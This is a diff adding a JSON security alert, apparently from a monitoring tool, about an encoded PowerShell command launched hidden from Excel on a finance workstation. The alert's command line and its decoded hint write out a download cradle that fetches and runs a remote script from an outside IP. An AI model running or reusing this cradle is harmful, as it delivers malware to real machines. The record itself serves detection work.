@@ -1,0 +1,35 @@
+{
+  "timestamp": "2026-09-29T21:50:33.104+0000",
+  "rule": {
+    "level": 12,
+    "description": "Suspicious execution of encoded PowerShell command with hidden window and download cradle syntax.",
+    "id": "92104",
+    "groups": ["windows", "sysmon", "process_creation", "execution"]
+  },
+  "agent": {
+    "id": "004",
+    "name": "win-fin-workstation-09",
+    "ip": "10.0.4.88"
+  },
+  "win": {
+    "system": {
+      "eventID": "4688",
+      "channel": "Security",
+      "computer": "CORP-FIN-09.internal.corp"
+    },
+    "eventdata": {
+      "subjectUserName": "kevin.finance",
+      "parentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+      "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "commandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADMALgAxADYAMQAuADIAMAAwAC4AMQAwAC8AcABheQBsAG8AYQBkAC4AcABzADEAJwApAA==",
+      "decodedHint": "IEX (New-Object Net.WebClient).DownloadString('http://193.161.200.10/payload.ps1')"
+    }
+  },
+  "data": {
+    "srcip": "193.161.200.10",
+    "dstuser": "kevin.finance",
+    "parent_process": "EXCEL.EXE",
+    "process": "powershell.exe"
+  },
+  "full_log": "A new process has been created. Creator Process: EXCEL.EXE. Process: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFg..."
+}
